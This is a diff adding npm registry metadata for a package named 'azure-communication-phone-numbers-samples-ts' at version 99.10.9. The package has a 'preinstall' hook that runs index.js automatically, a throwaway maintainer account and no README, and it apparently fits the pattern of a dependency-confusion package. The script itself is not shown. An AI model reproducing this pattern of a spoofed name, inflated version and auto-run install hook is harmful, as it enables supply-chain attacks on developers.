@@ -1,0 +1,62 @@
+{
+    "_id": "azure-communication-phone-numbers-samples-ts",
+    "name": "azure-communication-phone-numbers-samples-ts",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-communication-phone-numbers-samples-ts",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-communication-phone-numbers-samples-ts@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-yU91jlY1ZALqzgxErGmpCUJCYmktgWJbMKOwiXszFBTTHfPlPTMnHBb/caCJ78qZxItPMe7m9pj+cVIC1uYrKg==",
+                "shasum": "876650301a23483aae2a8c4bde13b55b7f41167a",
+                "tarball": "https://registry.npmjs.org/azure-communication-phone-numbers-samples-ts/-/azure-communication-phone-numbers-samples-ts-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5096,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOoBZACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqSKw//Xitv4EvprsCHtUYd5MXgVMAQSXxSA7RgVZ5kdgjUDIubPQlm\r\nbOe950AZe7amYxFeptPdZjmazSy7zIIndcMZHj4KKnuBDm4EHuASZ1tydQD1\r\nHfHifj7JTMgxj258wUi130BwOOsx0nfueaTcNY1HVJ7jMawV4DpnJxBiGTPE\r\nGCVN8th4m6etCMZ1e/BeUmpunCBK9wjl3QpTQkRpXopWd0Gl/0yyWWqjPgf8\r\napmEtfGBsfIXQCLn1oeDi98i/2SJtr4UBAFxU2BXjDtPQrom/VUROprrh7FU\r\naOF2x/l8tNJMvI7YgSAXeA3JFmEpbhPzhttBEvoZbpINfcqcMA9A/DVifJpY\r\n4ti8WecT92tWUyCdpDCmlUyKmmPEFyz471tKh3pMn5CuOJHZIaE2HxkUqa3O\r\nNx2U7n4IeTGanFBCKrpTTWI5ehHr2aNzxkFRwYdx296eQEYsC6NGYhDvdOpa\r\nVcEj7qPqcZOdkfe4sBqf/o/fLSQPV9QX2L2H/WPb3mRjgHYyEFopSUveaL0X\r\nAL1r6eQSWExfQIH0DsVfPKsJpGhbrVDatIU3RSZMs/3SMjN5lWfzhgnKWhGn\r\nUu8la9N7qxSzIXoiiTBCVbV2TBMsA6j3sqePEygbhTT0YzHWDgXJ/FVW5GnS\r\n1raCSGCeQOIiaewRmUHFymZnnJLbZFa8Akg=\r\n=3vgr\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "56l1kvda",
+                "email": "56l1kvda@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "56l1kvda",
+                    "email": "56l1kvda@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-communication-phone-numbers-samples-ts_99.10.9_1648001113847_0.3607859592593565"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T02:05:13.846Z",
+        "99.10.9": "2022-03-23T02:05:13.994Z",
+        "modified": "2022-03-23T02:05:14.123Z"
+    },
+    "maintainers": [
+        {
+            "name": "56l1kvda",
+            "email": "56l1kvda@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
